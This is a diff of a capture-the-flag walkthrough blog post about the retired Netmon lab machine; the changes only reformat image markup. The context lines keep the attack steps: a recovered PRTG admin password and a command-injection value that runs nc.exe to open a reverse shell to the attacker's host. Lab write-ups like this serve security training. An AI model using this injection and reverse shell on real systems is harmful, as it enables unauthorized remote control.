@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Netmon, a retired vulnerable [VM
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -120,41 +120,41 @@ Since anonymous FTP login is allowed, let's go with that first.
 
 To my pleasant surprise, `C:\Users\Public` is available.
 
-<a class="image-popup">
-![2f8bf31c.png](/assets/images/posts/netmon-htb-walkthrough/2f8bf31c.png)
-</a>
+
+{% include image.html image_alt="2f8bf31c.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/2f8bf31c.png" %}
+
 
 And guess what, `user.txt` is here!
 
-<a class="image-popup">
-![90a90b90.png](/assets/images/posts/netmon-htb-walkthrough/90a90b90.png)
-</a>
+
+{% include image.html image_alt="90a90b90.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/90a90b90.png" %}
+
 
 ### PRTG Network Monitor
 
 Moving on to the `http` service, this is how it looks like.
 
-<a class="image-popup">
-![542fe300.png](/assets/images/posts/netmon-htb-walkthrough/542fe300.png)
-</a>
+
+{% include image.html image_alt="542fe300.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/542fe300.png" %}
+
 
 In conjunction with the official security [advisory](https://www.paessler.com/about-prtg-17-4-35-through-18-1-37) and the [location](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) of the various configuration files, I was able to uncover a plaintext password from the file below.
 
-<a class="image-popup">
-![adca4be4.png](/assets/images/posts/netmon-htb-walkthrough/adca4be4.png)
-</a>
+
+{% include image.html image_alt="adca4be4.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/adca4be4.png" %}
+
 
 Here's the plaintext password.
 
-<a class="image-popup">
-![56c19c7a.png](/assets/images/posts/netmon-htb-walkthrough/56c19c7a.png)
-</a>
+
+{% include image.html image_alt="56c19c7a.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/56c19c7a.png" %}
+
 
 And since this is a backup and knowing administrators increment the year for convenience's sake, the password may be `PrTg@dmin2019`. Let's give it a shot.
 
-<a class="image-popup">
-![3214f2a7.png](/assets/images/posts/netmon-htb-walkthrough/3214f2a7.png)
-</a>
+
+{% include image.html image_alt="3214f2a7.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/3214f2a7.png" %}
+
 
 Awesome.
 
@@ -172,9 +172,9 @@ If you've read the blog carefully, you'll realize certain characters are encoded
 
 Verify that `nc.exe` is indeed downloaded.
 
-<a class="image-popup">
-![e26dd675.png](/assets/images/posts/netmon-htb-walkthrough/e26dd675.png)
-</a>
+
+{% include image.html image_alt="e26dd675.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/e26dd675.png" %}
+
 
 Next, we use the following parameters to run a reverse shell back to us.
 
@@ -182,15 +182,15 @@ Next, we use the following parameters to run a reverse shell back to us.
 test.txt; c:\Users\Public\Downloads\nc.exe 10.10.15.200 1234 -e cmd.exe
 ```
 
-<a class="image-popup">
-![4b13a195.png](/assets/images/posts/netmon-htb-walkthrough/4b13a195.png)
-</a>
+
+{% include image.html image_alt="4b13a195.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/4b13a195.png" %}
+
 
 Getting `root.txt` is trivial when you have `SYSTEM` privileges.
 
-<a class="image-popup">
-![4d1f295b.png](/assets/images/posts/netmon-htb-walkthrough/4d1f295b.png)
-</a>
+
+{% include image.html image_alt="4d1f295b.png" image_src="/13c45494-6a27-4d68-ad5f-496d8c8fb907/4d1f295b.png" %}
+
 
 :dancer:
 
